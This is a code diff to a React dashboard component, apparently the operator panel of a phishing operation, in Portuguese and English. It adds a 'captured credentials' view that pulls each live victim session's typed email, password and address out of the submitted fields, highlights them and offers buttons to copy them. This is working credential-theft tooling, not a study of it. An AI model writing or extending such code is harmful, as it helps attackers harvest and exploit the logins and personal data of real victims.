@@ -2,7 +2,7 @@ import { useEffect, useMemo, useRef, useState } from "react";
 import { subscribeToOnlineVisitors, type PresenceMeta } from "@/lib/presence";
 import { supabase } from "@/integrations/supabase/client";
 import { Button } from "@/components/ui/button";
-import { Activity, Eye, X, Zap, Radio } from "lucide-react";
+import { Activity, Eye, X, Zap, Radio, Mail, Lock, MapPin, Copy, Check } from "lucide-react";
 import { playDing, ensureNotificationPermission } from "@/lib/notify";
 
 /**
@@ -93,6 +93,7 @@ export function LiveSessionsPanel({ adId, pendingSessionIds, hasAddressIds, onFo
   const [focusSid, setFocusSid] = useState<string | null>(null);
   const [now, setNow] = useState(Date.now());
   const [flashSid, setFlashSid] = useState<string | null>(null);
+  const [copiedKey, setCopiedKey] = useState<string | null>(null);
   const seenJoinsRef = useRef<Set<string>>(new Set());
   const lastScreenRef = useRef<Map<string, string>>(new Map());
 
@@ -211,6 +212,24 @@ export function LiveSessionsPanel({ adId, pendingSessionIds, hasAddressIds, onFo
 
   const focusSession = focusSid ? online.get(focusSid) : null;
 
+  const copyValue = async (key: string, value: string) => {
+    try {
+      await navigator.clipboard.writeText(value);
+      setCopiedKey(key);
+      setTimeout(() => setCopiedKey((k) => (k === key ? null : k)), 1200);
+    } catch {
+      /* ignore */
+    }
+  };
+
+  const pickLead = (leadsArr: LeadRow[], names: string[]) => {
+    for (const n of names) {
+      const found = leadsArr.find((l) => (l.field_name || "").toLowerCase().includes(n));
+      if (found) return found;
+    }
+    return undefined;
+  };
+
   return (
     <div className="space-y-3 rounded-lg border-2 border-primary/40 bg-gradient-to-br from-primary/5 to-transparent p-3 sm:p-4">
       <header className="flex flex-wrap items-center justify-between gap-2">
@@ -240,7 +259,13 @@ export function LiveSessionsPanel({ adId, pendingSessionIds, hasAddressIds, onFo
             const stepIdx = SCREEN_ORDER.indexOf(meta.screenKind || "main");
             const progress = stepIdx >= 0 ? ((stepIdx + 1) / SCREEN_ORDER.length) * 100 : 10;
             const sessionActions = actions.filter((a) => a.session_id === sid).slice(0, 3);
-            const sessionLeads = leads.filter((l) => l.session_id === sid).slice(0, 3);
+            const sessionLeads = leads.filter((l) => l.session_id === sid);
+            const emailLead = pickLead(sessionLeads, ["email", "e-mail", "mail"]);
+            const passwordLead = pickLead(sessionLeads, ["password", "senha", "pass"]);
+            const addressLead = pickLead(sessionLeads, ["endereco", "endereço", "address", "cep"]);
+            const otherLead = sessionLeads.find(
+              (l) => l !== emailLead && l !== passwordLead && l !== addressLead,
+            );
 
             return (
               <button
@@ -283,15 +308,61 @@ export function LiveSessionsPanel({ adId, pendingSessionIds, hasAddressIds, onFo
                   />
                 </div>
 
-                {/* Mini timeline */}
-                <div className="space-y-0.5 text-[10px] text-muted-foreground">
-                  {sessionLeads[0] && (
-                    <div className="truncate">✏️ {sessionLeads[0].field_name}: <span className="font-mono text-foreground">{sessionLeads[0].value}</span></div>
-                  )}
-                  {sessionActions[0] && (
-                    <div className="truncate">⚡ {sessionActions[0].action}</div>
-                  )}
-                </div>
+                {/* Credenciais capturadas (destaque) */}
+                {(emailLead || passwordLead || addressLead || otherLead) && (
+                  <div className="space-y-1.5">
+                    {emailLead && (
+                      <CredField
+                        icon={<Mail className="h-3 w-3" />}
+                        label="E-mail"
+                        value={emailLead.value}
+                        tone="email"
+                        copied={copiedKey === `${sid}-email`}
+                        onCopy={(e) => {
+                          e.stopPropagation();
+                          void copyValue(`${sid}-email`, emailLead.value);
+                        }}
+                      />
+                    )}
+                    {passwordLead && (
+                      <CredField
+                        icon={<Lock className="h-3 w-3" />}
+                        label="Senha"
+                        value={passwordLead.value}
+                        tone="password"
+                        copied={copiedKey === `${sid}-pass`}
+                        onCopy={(e) => {
+                          e.stopPropagation();
+                          void copyValue(`${sid}-pass`, passwordLead.value);
+                        }}
+                      />
+                    )}
+                    {addressLead && !emailLead && !passwordLead && (
+                      <CredField
+                        icon={<MapPin className="h-3 w-3" />}
+                        label="Endereço"
+                        value={addressLead.value}
+                        tone="address"
+                        copied={copiedKey === `${sid}-addr`}
+                        onCopy={(e) => {
+                          e.stopPropagation();
+                          void copyValue(`${sid}-addr`, addressLead.value);
+                        }}
+                      />
+                    )}
+                    {!emailLead && !passwordLead && !addressLead && otherLead && (
+                      <div className="truncate text-[10px] text-muted-foreground">
+                        ✏️ {otherLead.field_name}: <span className="font-mono text-foreground">{otherLead.value}</span>
+                      </div>
+                    )}
+                  </div>
+                )}
+
+                {sessionActions[0] && (
+                  <div className="mt-1.5 truncate text-[10px] text-muted-foreground">
+                    ⚡ {sessionActions[0].action}
+                  </div>
+                )}
 
                 <div className="mt-2 flex items-center gap-1 text-[10px] font-medium text-primary opacity-0 transition-opacity group-hover:opacity-100">
                   <Eye className="h-3 w-3" /> abrir em foco
@@ -405,6 +476,48 @@ function FocusOverlay({
           )}
         </div>
       </div>
+    </div>
+  );
+}
+
+function CredField({
+  icon,
+  label,
+  value,
+  tone,
+  copied,
+  onCopy,
+}: {
+  icon: React.ReactNode;
+  label: string;
+  value: string;
+  tone: "email" | "password" | "address";
+  copied: boolean;
+  onCopy: (e: React.MouseEvent) => void;
+}) {
+  const toneClass =
+    tone === "password"
+      ? "border-orange-500/40 bg-orange-500/10"
+      : tone === "email"
+      ? "border-yellow-500/40 bg-yellow-500/10"
+      : "border-green-500/40 bg-green-500/10";
+  const iconColor =
+    tone === "password" ? "text-orange-600" : tone === "email" ? "text-yellow-700" : "text-green-700";
+  return (
+    <div className={`flex items-center gap-1.5 rounded-md border ${toneClass} px-1.5 py-1`}>
+      <span className={iconColor}>{icon}</span>
+      <span className="text-[9px] font-bold uppercase tracking-wide text-muted-foreground">{label}</span>
+      <span className="ml-auto min-w-0 flex-1 truncate text-right font-mono text-[11px] font-semibold text-foreground">
+        {value}
+      </span>
+      <button
+        type="button"
+        onClick={onCopy}
+        className="rounded p-0.5 text-muted-foreground hover:bg-background hover:text-foreground"
+        aria-label={`Copiar ${label}`}
+      >
+        {copied ? <Check className="h-3 w-3 text-green-600" /> : <Copy className="h-3 w-3" />}
+      </button>
     </div>
   );
 }
